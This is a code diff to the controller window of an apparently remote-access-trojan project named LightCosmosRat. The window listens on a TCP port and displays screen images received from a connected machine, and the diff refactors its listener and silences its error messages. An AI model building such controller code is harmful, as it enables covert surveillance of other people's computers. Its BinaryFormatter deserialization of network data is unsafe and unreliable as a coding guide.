@@ -13,6 +13,8 @@ namespace LightCosmosRat
 	public partial class Form2 : Form
 	{
         public bool HasConnected;
+        private TcpListener imageServer;
+        private int serverPort;
 		public Thread ServerThread = null;
 		public Thread ClientThread = null;
 		public Form2()
@@ -21,10 +23,11 @@ namespace LightCosmosRat
 			// The InitializeComponent() call is required for Windows Forms designer support.
 			//
 			InitializeComponent();
-			
-			//
-			// TODO: Add constructor code after the InitializeComponent() call.
-			//
+
+            //
+            // TODO: Add constructor code after the InitializeComponent() call.
+            //
+            serverPort = 0; //invalid value
 			CheckForIllegalCrossThreadCalls = false;
             HasConnected = false;
 		}
@@ -37,7 +40,7 @@ namespace LightCosmosRat
 				try{
 				pictureBox1.Image = (Image) bf.Deserialize(myStream);
 				}catch(Exception e){
-					MessageBox.Show(e.Message);
+					//MessageBox.Show(e.Message);
 					goto PINTING;
 				}
 			}
@@ -49,68 +52,52 @@ namespace LightCosmosRat
 			Server.Start();
             while (true)
             {
-                try
-                {
-                    myClient = Server.AcceptTcpClient();
-                }catch(ThreadInterruptedException iex)
-                {
-                    Server.Stop();
-                    return;
-                }
-                try
-                {
-                    ClientThread.Abort();
-                }catch(Exception e)
-                {
-                    e.ToString();
-                }
+                myClient = Server.AcceptTcpClient();
                 ClientThread = new Thread(ConnectionHandler);
                 ClientThread.Start(myClient);
-            }
-		}
-		void Button1Click(object sender, EventArgs e)
-		{
-			TcpListener Server;
-			int ServerPort = 0;
-			try{
-				ServerPort = int.Parse(textBox1.Text);
-			}catch(FormatException fe){
-				MessageBox.Show(fe.Message,"Port Error",MessageBoxButtons.OK,MessageBoxIcon.Error);
-				return;
-			}
-			
-			try{
-				Server = new TcpListener(IPAddress.Any,ServerPort);
-			}catch(Exception ex){
-				MessageBox.Show(ex.Message);
-				return;
-			}
-			button1.Enabled = false;
-			ServerThread = new Thread(ServerHandler);
-			ServerThread.Start(Server);
-		}
-		void Form2FormClosing(object sender, FormClosingEventArgs e)
-		{
-            //Serve a non lasciare thread ambulanti in giro
-            //tutto fixato ormai e privo di bug in ogni caso quando il programma si chiude non lascia tracce
-            // testato anche con listener multipli
-            if(!HasConnected)
-            {
-                try
-                {
-                    TcpClient Client = new TcpClient();
-                    Client.Connect("localhost", int.Parse(textBox1.Text));
-                }catch(Exception eppp)
+                while (ClientThread.IsAlive)
                 {
 
                 }
             }
+		}
+		void Button1Click(object sender, EventArgs e)
+        { 
 			try{
-				ServerThread.Abort();
-				ClientThread.Abort();
-			}catch(Exception ess){
-				MessageBox.Show(ess.Message);
+                serverPort = int.Parse(textBox1.Text);
+			}catch(FormatException fe){
+				//MessageBox.Show("Insert a valid port value","Port Error",MessageBoxButtons.OK,MessageBoxIcon.Error);
+				return;
 			}
+			
+			try{
+				imageServer = new TcpListener(IPAddress.Any,serverPort);
+			}catch(Exception ex){
+				//MessageBox.Show(ex.Message);
+				return;
+			}
+			button1.Enabled = false;
+			ServerThread = new Thread(ServerHandler);
+			ServerThread.Start(imageServer);
+		}
+		void Form2FormClosing(object sender, FormClosingEventArgs e)
+		{
+
+            try
+            {
+                imageServer.Stop();
+            }catch(Exception al)
+            {
+               //MessageBox.Show(al.Message);
+            }
+            try
+            {
+                ClientThread.Abort();
+                ServerThread.Abort();
+            }catch(Exception msg)
+            {
+                //MessageBox.Show(msg.Message);
+            }
 		}
 
         private void Form2_Load(object sender, EventArgs e)
